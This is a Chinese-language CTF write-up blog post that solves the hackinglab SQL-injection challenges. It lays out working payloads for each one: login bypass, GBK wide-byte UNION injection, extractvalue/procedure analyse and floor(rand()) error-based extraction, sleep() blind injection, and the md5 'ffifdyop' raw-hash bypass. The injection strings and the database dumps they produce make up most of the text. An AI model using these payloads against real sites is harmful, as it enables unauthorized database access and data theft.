---
layout: post
title: "hackinglab-sqli"
date: 2019-05-20
author: jjnoob
categories:
- 2019-05
tags:
- sqli
---

* content
{:toc}

> 谷歌上说这里的题比较简单, 就过来了. 


[参考](https://www.40huo.cn/blog/hackinglab-sqli.html)

[参考](https://hellohxk.com/blog/hackinglab-writeup/)

[参考](https://www.meetsec.cn/index.php/archives/9/)

[参考](http://www.myhack58.com/Article/html/3/7/2016/77063.htm)


# 一. 最简单的SQL注入
万能密码登陆
```
username=admin' or 1=1
password=123456
```

<br />

# 二. 熟悉注入环境
1. 提示需要登陆, 登陆后, 再打开原题目链接, 只有两行字.
2. 只有两行字却做成php, 而不是做成静态页面html.
3. url后加 `?id=1 or 1=1`

<br />

# 三. 防注入
## (1) 判断
1. 响应头中返回 `charset=gb2312`, 可能是宽字节注入.
2. `?id=2%df'`报错, 说明存在宽字节注入.

## (2) 获取信息
### 不断尝试得到字段长度: 
`?id=2%bf' order by num %23`

### 得到显位数: 
`?id=2%bf' union select 1,2,3 %23`


> 显示位:
> [参考](https://blog.csdn.net/weixin_43379478/article/details/84943001)
> 比如我们通过ORDER BY命令知道了表的列数为11。然后再使用UNION SELECT 1,2,3…,11 from table，网页中显示了信息8，那么说明网页只能够显示第8列中信息，不能显示其他列的信息。也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。所以如果我们想要知道某个属性的值，比如admin,就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。

### 得到数据库信息
```php
?id=2%bf' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23
```

> mysql `group_concat` 函数能将相同的行组合起来, 方便查看


### 得到字段信息
```php
?id=2%bf' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7361655f757365725f73716c6934) %23
```

`0x736....`为表名的16进制表示.


## (3) 脱库
### 得到记录长度:
```php
?id=2%bf' union select 1,2,(select count(*) from sae_user_sqli4) %23
```
### 得到flag:
```php
?id=2%bf' union select 1,2,(select group_concat(title_1,content_1) from sae_user_sqli4) %23
```

<br />

# 四. limit注入
MySQL在MySQL5.x版本, limit配合 `procedure`函数和 `INTO`函数 进行注入. `INTO`除非有写入shell的权限，否则是无法利用的. 而MySQL默认只有`analyse()`与`procedure`搭配.


> `procedure analyse()`函数是MySQL内置的对MySQL字段值进行统计分析后给出建议的字段类型


修改`start`值, 页面内容也会随之变化, 而`num`则不会, 所以突破口可能是`start`参数.

## (1) 报错
尝试`?start=1 procedure analyse(1,1)%23&num=1`, 显示无法使用

尝试在analyse函数中构造错误, 通过返回错误显示来得到结果. 修改analyse中的参数, 尝试在参数中使用语句:
```php
?start=1 procedure analyse(select 1,1)%23&num=1
```
报错

尝试`extractvalue`函数, 随便填两个字符串
> `extractvalue`用于xml解析

```php
?start=1 procedure analyse(extractvalue(0x213,0x12),1)%23&num=1
```
报错注入

尝试:
```php
?start=1 procedure analyse(extractvalue(0x213,version()),1)%23&num=1
```


返回报错, 但是显示不全. 所以在之前就得开始报错, 修改内容使其更好显示, 使用`concat`查看:
> `CONCAT()` 函数是mysql中非常重要的函数，可以将多个字符串连接成一个字符串
> `@@version`显示当前数据库版本


```php
?start=1 procedure analyse(extractvalue(1,concat(0x25,@@version)),1)%23&num=1
```

看到错误显示, 得到数据库版本.

## (2) 注入
得到当前数据库:
```php
?start=1 procedure analyse(extractvalue(0x213,concat(0x25,database())),1)%23&num=1
```

得到表名:
```php
?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)%23&num=1
```
出article和user表

得到列名:
```php
得到列名
?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636C65))),1)%23&num=1
?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(column_name) from information_schema.columns where table_name=0x75736572))),1)%23&num=1
```
得到id,username,password,lastloginI等字段


查看username字段有哪些值:
```php
?start=1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(username) from user))),1)%23 &num=1 %23
```
出现user,admin,flag

查username为flag的password
```php
start=1 procedure analyse(extractvalue(rand(),concat(0x3a,(select password from user where username=0x666c6167))),1)%23 &num=1 %23
```

<br />

# 五. 邂逅

> firefox浏览器出了问题, 我还以为是burpsuite除了问题. 卸了重装就好. 

注入点在图片中.


## (1) 宽字节注入确认
用burp:
```
http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27.jpg
```

得到报错:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.jpg'' at line 1<br />
<b>Warning</b>:  mysql_fetch_row() expects parameter 1 to be resource, boolean given in <b>sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/myimages1.php</b> on line <b>18</b><br />
```
说明图片这个位置存在宽字节注入.

## (2) 注入
### 得到字段长度
分别尝试`order by 1,2,3,4,5`到5的时候报错, 说明字段长度为4 
```
%bf%27 order by 4 %23
```

### 得到显示位
```
%bf%27 union select 1,2,3,4 %23
```
显示位为3

### 得到所有表的信息
```
%bf%27 union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()),4 %23
```
有`article`,`pic`表.

### 得到表的字段信息
```
%bf%27 union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=0x61727469636c65),4 %23
```
`pic`表中的字段有`id,title,content,others `

### 脱库
```
%bf%27 union select 1,2,(select count(*) from pic),4 %23
```
pic中有3条记录

```
%bf%27 union select 1,2,(select  group_concat(picname) from pic),4 %23
```
得到pic中有3张图片:`dog1.jpg,cat1.jpg,flagishere_askldjfklasjdfl.jpg`

地址栏访问第三张图片, 得到flag.

<br />

# 六. ErrorBased
[参考](https://www.waitalone.cn/mysql-error-based-injection.html)

[参考](https://www.csdndoc.com/article/11255582)


## (1) 测试
测试:
```
?username=admin%27
```
有报错

尝试看结果
```
?username=admin%27 union select count(*),concat( floor(rand(0)*2), 0x2d2d2d, version(), 0x2d2d2d) x from information_schema.schemata group by x%23
```

## (2) 通过floor报错
查看数据库版本`5.6.42`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```

查看当前用户`saeuser@14.116.224.8`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```

查看当前数据库`mydbs`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```

爆库`information_schema, mydbs, test`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```

爆表`log, motto, user`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
> 通过修改`database()`后面的`LIMIT 0,1`中的`0`的值, 分别为`1 2`. 从而改变注入数据.


爆字段, motto表的字段为`id,user,motto`:
```
?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x6d6f74746f LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```

读内容:
```
?username=admin' and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,motto,0x23) FROM motto limit 3,1)))%23
```

key:
```
notfound!
```

<br />

# 七. 盲注
测试:
```
username=admin%27 and sleep(10)%23
```
发现注入成功


> sleep(N)可以让此语句运行N秒钟, 不过我删了它后, 仍然可以注入成功.

可以手工盲注, 网上推荐的是sqlmap盲注, 不过我没有跑出来, 据说是这题网络比较慢. 

> sqlmap过段时间会学习, 这里先跳过, 事情做多了容易乱.

<br />

# 八. SQL注入通用防护
注入有3种，post方式，get方式，cookie注入. cookie注入严格算post注入的一种.

> 不会写, cookie注入没学过, sqlmap不会用...

<br />

# 九. 据说哈希后的密码是不能产生注入的
## 源码:
```php
select * from user where userid=".intval($_GET['userid'])." and password='".md5($_GET['pwd'], true) ."'
```

* 对传入的userid使用`intval()`函数转化为数字
* password使用`md5()`进行转化.

> php中md5函数的参数含义:
> `password='".md5($_GET['pwd'], true)`
> 第二个可选。规定十六进制或二进制输出格式：
> TRUE  16 字符二进制格式
> FALSE  32 字符十六进制数 (默认)


## 注入

思路:
当md5后的hex转换成字符串后，如果包含 `'or'xxxx `这样的字符串，那整个sql变成
```sql
SELECT * FROM admin WHERE pass = ''or'xxxx
```
就可以注入了

从别人的writeup里面找到符合该要求的字符串`ffifdyop`
```
md5("ffifdyop")，276f722736c95d99e921722cf9ed621c

md5("ffifdyop",true)： 'or'6?]??!r,??b
```

构造:
```
?userid=1&pwd=ffifdyop
```
